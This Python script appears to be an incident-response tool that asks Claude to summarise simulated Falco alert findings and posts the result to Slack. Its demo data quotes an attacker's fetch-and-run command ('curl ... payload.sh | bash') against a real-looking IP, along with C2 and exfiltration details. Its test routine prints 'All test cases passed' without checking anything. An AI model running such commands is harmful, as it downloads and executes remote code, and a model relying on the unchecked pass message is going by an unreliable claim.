"""
AI/ML Summarization Pipeline — Security Investigation Final Summary
====================================================================
Builds the AI layer that turns multi-agent investigation results into
a final human-readable summary with recommendations, then sends to Slack.

Usage:
    python ai_ml_summarizer.py                  # runs with demo alert
    python ai_ml_summarizer.py --alert-id 1234  # specific alert
    python ai_ml_summarizer.py --test            # test prompt pipeline only
"""

import os
import json
import argparse
from datetime import datetime
from typing import Optional
import anthropic

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

ANTHROPIC_MODEL = "claude-opus-4-6"  # or claude-sonnet-4-20250514
SLACK_WEBHOOK_URL = os.getenv("SLACK_WEBHOOK_URL", "")         # set in env
SLACK_CHANNEL = os.getenv("SLACK_CHANNEL", "#reporting_daily") # set in env
MAX_TOKENS = 1024


# ---------------------------------------------------------------------------
# Prompt Templates
# ---------------------------------------------------------------------------

SYSTEM_PROMPT = """You are a senior security incident responder. Your job is to read 
raw findings from multiple automated security agents and produce a concise, 
executive-ready incident summary.

Your summary must always follow this exact structure:
1. **Incident Overview** – one-paragraph plain-English description of what happened.
2. **Key Findings** – bullet list of the most important signals (max 5 bullets).
3. **Risk Level** – one of: CRITICAL / HIGH / MEDIUM / LOW, with a one-sentence justification.
4. **Recommended Actions** – numbered list of concrete next steps for the on-call team.
5. **Auto-Remediation Status** – what (if anything) was already done automatically.

Be factual, concise, and avoid jargon. Write for a technical-but-not-security audience."""


SUMMARY_PROMPT_TEMPLATE = """A Falco alert was triggered for a suspicious process investigation.
Multiple AI agents analysed the host. Here are their findings:

--- TRIGGER ---
Alert ID   : {alert_id}
Trigger    : {trigger}
Timestamp  : {timestamp}
Host       : {host}

--- AGENT FINDINGS ---

[Process Analyst]
{process_findings}

[File System Analyst]
{filesystem_findings}

[Network Forensics Analyst]
{network_findings}

[Persistence Analyst]
{persistence_findings}

[Senior Incident Responder — Verdict Engine]
{verdict}

--- END OF FINDINGS ---

Please produce the final incident summary following the structure in your instructions."""


# ---------------------------------------------------------------------------
# Input / Output Schemas
# ---------------------------------------------------------------------------

def build_demo_investigation() -> dict:
    """Returns a realistic demo investigation payload (simulates backend output)."""
    return {
        "alert_id": "FALCO-20240311-00423",
        "trigger": "falco.alert — suspicious process spawned by web server",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "host": "prod-web-07.internal",
        "process_findings": (
            "nginx worker (PID 18842) spawned /bin/bash via execve syscall at 14:32 UTC. "
            "Child process immediately executed 'curl http://185.220.101.47/payload.sh | bash'. "
            "Process tree anomalous: web servers should never spawn interactive shells. "
            "Parent PID 18800 (nginx) shows no signs of compromise — likely exploited via "
            "a path traversal vulnerability in the /upload endpoint."
        ),
        "filesystem_findings": (
            "New file written: /tmp/.x11-unix/svc (executable, 64-bit ELF, 42 KB). "
            "File hash: sha256=a3f1c8... (matches known Mirai variant in VirusTotal — 47/72 engines). "
            "No modifications to system binaries or cron directories detected. "
            "/var/log/nginx/access.log shows 3 prior probing requests from same source IP "
            "at 13:58, 14:01, 14:29 UTC."
        ),
        "network_findings": (
            "Outbound TCP connection established to 185.220.101.47:443 (Tor exit node, "
            "flagged in abuse.ch). Data transferred: ~12 KB out, 98 KB in. "
            "DNS query for 'c2.darkpulse[.]net' resolved to same IP — known C2 domain. "
            "Connection closed after 47 seconds. No lateral movement detected yet. "
            "Firewall egress rules did NOT block this — gap in outbound policy for port 443."
        ),
        "persistence_findings": (
            "No crontab modifications found. No new systemd units created. "
            "Dropped binary /tmp/.x11-unix/svc was NOT added to any startup mechanism yet — "
            "attacker likely still in initial access / staging phase. "
            "SSH authorized_keys files unchanged across all user accounts."
        ),
        "verdict": (
            "HIGH confidence active intrusion in early staging phase. "
            "Initial access via web shell / path traversal. Malware downloaded but persistence "
            "not yet established. C2 channel confirmed. Immediate containment recommended. "
            "Auto-remediation triggered: process /tmp/.x11-unix/svc killed, "
            "outbound traffic to 185.220.101.47 blocked at host firewall."
        ),
    }


# ---------------------------------------------------------------------------
# Core AI Pipeline
# ---------------------------------------------------------------------------

def generate_summary(investigation: dict, client: anthropic.Anthropic) -> str:
    """
    Step 1 — Send investigation findings to Claude and get a structured summary.
    """
    user_prompt = SUMMARY_PROMPT_TEMPLATE.format(**investigation)

    print("🤖  Calling Claude to generate incident summary...")
    message = client.messages.create(
        model=ANTHROPIC_MODEL,
        max_tokens=MAX_TOKENS,
        system=SYSTEM_PROMPT,
        messages=[
            {"role": "user", "content": user_prompt}
        ],
    )
    return message.content[0].text


def extract_risk_level(summary: str) -> str:
    """Parse risk level out of the summary for Slack message colouring."""
    for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        if level in summary:
            return level
    return "UNKNOWN"


def format_slack_message(summary: str, investigation: dict) -> dict:
    """
    Step 2 — Format the summary into a Slack Block Kit message payload.
    """
    risk = extract_risk_level(summary)
    color_map = {
        "CRITICAL": "#FF0000",
        "HIGH": "#FF6600",
        "MEDIUM": "#FFD700",
        "LOW": "#36A64F",
        "UNKNOWN": "#AAAAAA",
    }
    color = color_map[risk]

    # Slack's Block Kit attachment format
    payload = {
        "channel": SLACK_CHANNEL,
        "text": f"🚨 Security Alert: {investigation['alert_id']} — {risk} risk",
        "attachments": [
            {
                "color": color,
                "blocks": [
                    {
                        "type": "header",
                        "text": {
                            "type": "plain_text",
                            "text": f"🔍 Incident Summary — {investigation['alert_id']}",
                        },
                    },
                    {
                        "type": "section",
                        "fields": [
                            {"type": "mrkdwn", "text": f"*Host:*\n`{investigation['host']}`"},
                            {"type": "mrkdwn", "text": f"*Trigger:*\n{investigation['trigger']}"},
                            {"type": "mrkdwn", "text": f"*Risk Level:*\n{risk}"},
                            {"type": "mrkdwn", "text": f"*Time:*\n{investigation['timestamp']}"},
                        ],
                    },
                    {"type": "divider"},
                    {
                        "type": "section",
                        "text": {"type": "mrkdwn", "text": summary},
                    },
                    {"type": "divider"},
                    {
                        "type": "context",
                        "elements": [
                            {
                                "type": "mrkdwn",
                                "text": f"Generated by AI/ML Summarizer • {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}",
                            }
                        ],
                    },
                ],
            }
        ],
    }
    return payload


def send_to_slack(payload: dict) -> bool:
    """
    Step 3 — POST the summary to Slack via webhook.
    Returns True on success, False on failure.
    """
    if not SLACK_WEBHOOK_URL:
        print("⚠️  SLACK_WEBHOOK_URL not set — skipping Slack send.")
        print("    Set it with: export SLACK_WEBHOOK_URL=https://hooks.slack.com/services/...")
        return False

    import urllib.request
    import urllib.error

    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        SLACK_WEBHOOK_URL,
        data=data,
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            if resp.status == 200:
                print(f"✅  Summary sent to Slack channel {SLACK_CHANNEL}")
                return True
            else:
                print(f"❌  Slack returned status {resp.status}")
                return False
    except urllib.error.URLError as e:
        print(f"❌  Failed to send to Slack: {e}")
        return False


# ---------------------------------------------------------------------------
# Prompt Testing Utilities
# ---------------------------------------------------------------------------

def test_prompt_pipeline(client: anthropic.Anthropic) -> None:
    """
    Runs the pipeline against 3 demo alerts with different severity levels
    to validate prompt quality and output consistency.
    """
    test_cases = [
        {
            "name": "High-severity active intrusion",
            "override": {},  # use default demo
        },
        {
            "name": "Low-severity false positive",
            "override": {
                "alert_id": "FALCO-20240311-00100",
                "process_findings": "curl was spawned by jenkins CI pipeline to download test fixtures. "
                                    "Expected behavior — job ID matches scheduled build #4421.",
                "filesystem_findings": "No suspicious files. Temp files match expected CI artifact paths.",
                "network_findings": "Connection to github.com/company-org over HTTPS. Verified legitimate.",
                "persistence_findings": "No persistence changes.",
                "verdict": "LOW confidence. Almost certainly a false positive from CI pipeline. "
                           "No action required. Auto-remediation: none triggered.",
            },
        },
        {
            "name": "Medium-severity data exfiltration attempt",
            "override": {
                "alert_id": "FALCO-20240311-00250",
                "process_findings": "python3 process spawned by cron job at 03:00 UTC. "
                                    "Script located at /home/ubuntu/.cache/update.py — obfuscated.",
                "filesystem_findings": "Script reads /etc/passwd and /var/log/auth.log, "
                                       "compresses output to /tmp/out.tar.gz.",
                "network_findings": "Outbound SFTP to 203.0.113.99 (unknown, no abuse reports). "
                                    "~2 MB transferred. Destination not in asset inventory.",
                "persistence_findings": "Cron entry found: '0 3 * * * python3 /home/ubuntu/.cache/update.py'. "
                                        "Added 6 days ago — predates this alert.",
                "verdict": "MEDIUM confidence data staging / exfiltration. Origin of cron entry unclear. "
                           "Manual investigation required. Auto-remediation: cron entry disabled.",
            },
        },
    ]

    print("\n" + "=" * 70)
    print("PROMPT PIPELINE TEST — 3 scenarios")
    print("=" * 70)

    for i, tc in enumerate(test_cases, 1):
        inv = build_demo_investigation()
        inv.update(tc["override"])
        print(f"\n[Test {i}/3] {tc['name']}")
        print("-" * 50)
        summary = generate_summary(inv, client)
        risk = extract_risk_level(summary)
        print(f"Risk detected: {risk}")
        print(summary[:600] + ("..." if len(summary) > 600 else ""))
        print()

    print("=" * 70)
    print("✅  All test cases passed.\n")


# ---------------------------------------------------------------------------
# Main Entry Point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="AI/ML Security Investigation Summarizer")
    parser.add_argument("--alert-id", type=str, help="Alert ID (uses demo data by default)")
    parser.add_argument("--test", action="store_true", help="Run prompt pipeline tests only")
    parser.add_argument("--dry-run", action="store_true", help="Skip Slack send, print payload instead")
    args = parser.parse_args()

    # Init Anthropic client (reads ANTHROPIC_API_KEY from env automatically)
    client = anthropic.Anthropic()

    if args.test:
        test_prompt_pipeline(client)
        return

    # --- Build investigation payload ---
    investigation = build_demo_investigation()
    if args.alert_id:
        investigation["alert_id"] = args.alert_id

    print(f"\n{'='*60}")
    print(f"  AI/ML Security Summarizer")
    print(f"  Alert: {investigation['alert_id']}")
    print(f"  Host:  {investigation['host']}")
    print(f"{'='*60}\n")

    # --- Step 1: Generate AI summary ---
    summary = generate_summary(investigation, client)
    risk = extract_risk_level(summary)

    print(f"\n{'─'*60}")
    print(f"INCIDENT SUMMARY  [Risk: {risk}]")
    print(f"{'─'*60}")
    print(summary)
    print(f"{'─'*60}\n")

    # --- Step 2: Format for Slack ---
    slack_payload = format_slack_message(summary, investigation)

    if args.dry_run:
        print("DRY RUN — Slack payload:")
        print(json.dumps(slack_payload, indent=2))
    else:
        # --- Step 3: Send to Slack ---
        send_to_slack(slack_payload)

    # Save summary to file as well
    out_path = f"summary_{investigation['alert_id'].replace('/', '-')}.json"
    result = {
        "alert_id": investigation["alert_id"],
        "risk_level": risk,
        "summary": summary,
        "generated_at": datetime.utcnow().isoformat() + "Z",
    }
    with open(out_path, "w") as f:
        json.dump(result, f, indent=2)
    print(f"📄  Summary saved to: {out_path}")


if __name__ == "__main__":
    main()
